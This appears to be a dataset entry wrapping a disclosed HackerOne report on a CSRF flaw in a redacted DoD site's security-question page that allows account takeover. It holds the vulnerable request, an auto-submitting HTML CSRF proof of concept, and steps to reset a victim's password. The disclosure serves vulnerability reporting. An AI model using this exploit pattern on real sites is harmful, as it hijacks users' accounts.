{
    "reported_to": "U.S. Dept Of Defense",
    "reported_by": "prakhar0x01 ",
    "title": "CSRF Attack on changing security questions leads to full Account TakeOver",
    "content": "\nDescription:\nHii,\nWhile researching https://www.\u2588\u2588\u2588\u2588/, I discovered that an attacker could exploit a CSRF vulnerability to perform a password reset and gain full control of any user's account.\nThere is a feature in the user profile that allows users to change their security questions and answers. However, when the user changes this information, the application does not verify the CSRF token, resulting in a CSRF vulnerability in that functionality.\nAdditionally, there is another functionality on the reset password. Users can change their password via the security questions. However, exploiting the previously mentioned vulnerability will lead to bypassing this feature and result in a 1-Click Account Takeover.\nVulnerable Request\nCode 802 Bytes\n1POST /member/updatesecurityquestions HTTP/2\n2Host: www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Cookie: {YOUR-COOKIE}\n4Content-Length: 170\n5Cache-Control: max-age=0\n6Upgrade-Insecure-Requests: 1\n7Origin: https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n8Content-Type: application/x-www-form-urlencoded\n9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36\n10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n11Referer: https://www.\u2588\u2588\u2588\u2588\u2588\u2588/member/updatesecurityquestions\n12Accept-Encoding: gzip, deflate\n13Accept-Language: en-US,en;q=0.9\n14\n15security_questions1=1&security_question_answer1=temp&security_questions2=2&security_question_answer2=temp&security_questions3=3&security_question_answer3=temp&submit=Save\nReferences\nVideo PoC\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\n1- CSRF Vulnerability on Changing Security Questions/Answers\n2 - Account Takeover\nSystem Host(s)\nwww.\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\n1 - Create an Account on : https://www.\u2588\u2588\u2588/\n2 - Navigate to : https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/member/updatesecurityquestions and update Security questions\n3 - Intercept the request, Create CSRF PoC or you can use this\nCode 871 Bytes\n1<html>\n2  <!-- CSRF PoC - generated by Burp Suite Professional -->\n3  <body>\n4    <form action=\"https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/member/updatesecurityquestions\" method=\"POST\">\n5      <input type=\"hidden\" name=\"security&#95;questions1\" value=\"1\" />\n6      <input type=\"hidden\" name=\"security&#95;question&#95;answer1\" value=\"hacked\" />\n7      <input type=\"hidden\" name=\"security&#95;questions2\" value=\"2\" />\n8      <input type=\"hidden\" name=\"security&#95;question&#95;answer2\" value=\"hacked\" />\n9      <input type=\"hidden\" name=\"security&#95;questions3\" value=\"3\" />\n10      <input type=\"hidden\" name=\"security&#95;question&#95;answer3\" value=\"hacked\" />\n11      <input type=\"hidden\" name=\"submit\" value=\"Save\" />\n12      <input type=\"submit\" value=\"Submit request\" />\n13    </form>\n14    <script>\n15      history.pushState('', '', '/');\n16      document.forms[0].submit();\n17    </script>\n18  </body>\n19</html>\n4 - Execute it in the browser, See that security questions have been changed.\n5 - Now, navigate to another private window, go to https://www.\u2588\u2588\u2588\u2588\u2588\u2588/forgotpassword/?redirect_to=%2Fmember%2Foptions%2Fcurrenttab%2Femail, Observe an option On Screen Reset\n6 - Since as an attacker, you know the victim's security questions & answers, hence put the right answers & you can change the victim's password.\nSuggested Mitigation/Remediation Actions\n\n",
    "severity": [
        8.8,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Cross-Site Request Forgery (CSRF)"
    ],
    "screenshots": {},
    "disclosed_date": 1734569220,
    "report_url": "https://hackerone.com/reports/2652603",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Create an account on the target website and navigate to the security questions update page."
        ],
        [
            2,
            "Intercept the request to update security questions and create a CSRF PoC using the provided HTML form."
        ],
        [
            3,
            "Execute the CSRF PoC in the victim's browser to change their security questions and answers."
        ],
        [
            4,
            "Navigate to the password reset page in a private window and use the known security answers to reset the victim's password."
        ]
    ],
    "vuln_description": "A CSRF vulnerability in the security questions update functionality allows an attacker to change a victim's security questions and answers without their consent. This can then be used to perform a password reset and gain full control of the victim's account.",
    "reason": "The attack involves multiple components (CSRF exploit and password reset) and requires understanding the interaction between them. However, the steps are straightforward once the CSRF vulnerability is identified.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}